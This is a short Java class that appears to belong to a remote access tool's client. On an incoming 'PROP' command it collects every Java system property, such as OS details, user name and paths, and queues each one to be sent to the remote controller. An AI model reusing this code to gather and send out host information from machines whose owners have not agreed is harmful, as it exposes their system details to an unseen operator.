package com.redpois0n.packets.in;

import java.util.Set;

import com.redpois0n.Connection;
import com.redpois0n.packets.out.Header;


public class PacketPROP extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Set<Object> set = System.getProperties().keySet();
		for (Object str : set) {
			Connection.addToSendQueue(new PacketBuilder(Header.VARIABLES_PROPERTIES, new String[] { str.toString(), System.getProperty(str.toString()) }));
		}
	}

}
